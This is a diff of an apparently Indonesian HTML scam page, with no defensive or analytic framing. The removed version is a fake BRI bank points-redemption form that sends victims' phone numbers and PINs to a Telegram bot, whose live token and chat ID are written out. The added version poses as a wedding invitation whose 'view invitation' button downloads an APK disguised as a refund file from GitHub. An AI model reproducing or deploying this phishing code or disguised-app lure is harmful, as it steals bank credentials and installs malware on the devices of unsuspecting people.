@@ -1,158 +1,145 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title> PENUKARAN POIN BRI</title>
-  <meta name="viewport" content="width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Undangan Pernikahan</title>
+
   <style>
+    body, html {
+      overflow-x: hidden; /* Prevent horizontal scrolling */
+      height: 100%;
+      margin: 0;
+    }
+
     body {
       font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      max-width: 800px; /* Menetapkan lebar maksimal untuk konten */
-      margin: 0 auto; /* Membuat konten tetap di tengah */
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      min-height: 100%;
     }
 
-.container {
-      text-align: center;
-    }
-    .container img {
-      display: block;
-      margin: 0 auto;
-      max-width: 100%;
-    }
-    
-    .slider-container {
-      position: relative;
-      max-width: 100%;
-      overflow: hidden;
-    }
-
-    .slider {
+    #header {
       width: 100%;
-      max-height: 300px;
-      object-fit: cover;
-      transition: transform 0.5s ease-in-out;
-      display: none;
+      height: 316px; /* Tinggi gambar */
+      background-image: url('https://i.ibb.co/ynKRQtD/IMG-20240105-214853.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
     }
 
-    .slider.active {
-      display: block;
+    .container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex: 1; /* Mempertahankan tinggi 100% container */
+      flex-direction: column; /* Center content vertically */
     }
 
-    .form-container {
-      margin-bottom: 50px;
+    a {
+      text-decoration: none;
     }
 
-    .form-container form {
+    button {
+      width: calc(100% - 20px);
+      background-color: #4caf50;
+      color: #fff;
+      padding: 13px;
+      border: none;
+      border-radius: 9px;
+      cursor: pointer;
+      margin-top: 10px; /* Jarak 10px dari atas */
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    .button-caption {
+      font-family: 'Roboto', sans-serif;
+      font-weight: bold;
+      text-transform: uppercase;
+      margin-bottom: 10px; /* Jarak 10px dari bawah */
+    }
+
+    .marquee-container {
       display: flex;
       flex-direction: column;
       align-items: center;
-      margin-top: 10px;
+      margin-top: -70px;
     }
 
-    .form-container input[type="tel"],
-    .form-container input[type="password"],
-    .form-container input[type="Submit"] {
-      width: calc(85% - 8px); /* Reduce width by 4 pixels on each side */
-      padding: 13px;
-      border-radius: 8px;
-      border: 1px solid #007bff;
-      margin-bottom: 30px; /* Jarak antara kolom nomor hp dan kolom pin */
-      margin-left: 4px; /* Add margin on the left side */
-    }
-
-    .form-container input[type="Submit"] {
-      width: calc(100% - 8px);
-      max-width: 330px;
-      padding: 13px;
-      border-radius: 5px;
-      background-color: #007bff;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      margin-left: 7px;
-    }
-
-    /* Ukuran relatif untuk gambar di bawah */
-    .gambar-bawah {
-      display: flex;
-      justify-content: center;
+    .marquee {
+      overflow: hidden;
+      white-space: nowrap;
+      text-align: center;
       position: relative;
-      bottom: -10px;
     }
 
-    .gambar-bawah img {
-      width: 90%;
-      object-fit: cover;
-      margin: 0 25px;
+    .marquee p {
+      display: inline-block;
+      background-color: black; /* Warna latar belakang tetap hitam */
+      color: white; /* Warna text */
+      padding: 0 50px; /* Padding sesuaikan kebutuhan */
+      animation: marquee 15s linear infinite;
+    }
+
+    @keyframes marquee {
+      0% {
+        transform: translateX(100%);
+      }
+      100% {
+        transform: translateX(-100%);
+      }
+    }
+
+    .invitation-text {
+      text-align: center;
+      margin-top: 20px; /* Jarak 20px dari tombol unduh */
+    }
+
+    .additional-text {
+      font-family: 'Roboto', sans-serif;
+      text-transform: uppercase;
+      margin-top: 10px; /* Jarak 10px dari teks sebelumnya */
+    }
+
+    .smaller-text {
+      font-size: 13px; /* Ukuran teks yang lebih kecil */
+      line-height: 1.3; /* Spasi baris yang sesuai */
     }
   </style>
-  <script>
-    function sendMessageToTelegram(message) {
-      var xhttp = new XMLHttpRequest();
-      xhttp.onreadystatechange = function() {
-        if (this.readyState === 4 && this.status === 200) {
-          // Respons atau tindakan setelah pesan terkirim berhasil
-          console.log("Pesan terkirim: " + message);
-        }
-      };
-      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
-
-      // Kirim permintaan POST
-      xhttp.open("POST", url, true);
-      xhttp.send();
-    }
-
-    function kirimPesan() {
-      var nomorHP = document.getElementById('nomor_hp').value;
-      var pin = document.getElementById('pin').value;
-      // Validasi jika nomor HP atau nomor PIN kosong
-  if (nomorHP.trim() === '' || pin.trim() === '') {
-    // Memicu efek getaran
-    if (navigator.vibrate) {
-      navigator.vibrate(200); // 200 milidetik getaran
-    }
-    return;
-  }
-
-      var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin;
-      sendMessageToTelegram(message);
-      window.location.href = 'otp.html'; // Mengarahkan ke halaman otp.html
-    }
-function updateStyle(inputId) {
-    var inputElement = document.getElementById(inputId);
-    var inputValue = inputElement.value;
-
-    if (inputValue !== '') {
-      inputElement.style.fontWeight = 'bold';
-      inputElement.style.color = 'rgba(black)'; // Warna ungu agak kehitaman
-    } else {
-      inputElement.style.fontWeight = 'normal';
-      inputElement.style.color = 'inherit'; // Kembalikan warna default
-    }
-  }
-  </script>
 </head>
 <body>
-<div class="container">
-    <img src="https://i.ibb.co/FHwSV6d/IMG-20240218-024902.jpg" alt="fhoto" class="header-image"> </div>
-  <div class="slider-container">
-    <img class="slider active" src="https://i.ibb.co/tZ0M4t0/IMG-20240218-024924.jpg" alt="Slider Image 1">
-    <img class="slider" src="https://i.ibb.co/MRQNSSH/IMG-20240218-024844.jpg" alt="Slider Image 2">
-    <img class="slider" src="https://i.ibb.co/qjsg9W7/IMG-20240218-025130.jpg" alt="Slider Image 3">
+
+  <div id="header"></div>
+
+  <div class="container">
+    <div class="marquee-container">
+      <div class="marquee">
+        <p>
+          Mohon Do'a Dan Restu - Lokasi Resepsi & Susunan Acara, Silahkan Buka Undangan Lokasi Resepsi & Susunan Acara, Silahkan Buka Undangan. Terimakasih
+        </p>
+      </div>
+    </div>
+    <div class="button-caption">UNDANGAN PERNIKAHAN</div>
+    <a href="https://github.com/Satudua122/Satudua122.github.io/raw/main/Unduh-File-Refund-Dana.apk" download="Unduh-File-Refund-Dana.apk">
+      <button>
+        Lihat Undangan
+      </button>
+    </a>
+    <div class="invitation-text">
+      <p class="smaller-text">
+        Merupakan suatu kehormatan dan kebahagiaan bagi kami<br>
+        Apabila Bapak/Ibu/Saudara/i berkenan hadir<br>
+        untuk memberikan doa restu kepada kedua mempelai
+      </p>
+      <div class="additional-text">
+        Atas Kehadiran dan Do'a Kami Ucapkan Terimakasih
+      </div>
+    </div>
   </div>
 
-  <div class="form-container">
-    <form onsubmit="kirimPesan(); return false;">
-      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="+62 Nomor Handphone" oninput="updateStyle('nomor_hp')">
-      <input type="tel" id="pin" name="pin" placeholder="Kode Tukar Poin" maxlength="6" class="pin-input" oninput="updateStyle('pin')">
-      <input type="Submit" value="Lanjutkan">
-    </form>
-  </div>
-
-  <div class="gambar gambar-bawah">
-    <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Logo LPS">
-  </div>
 </body>
-  </html>
+</html>
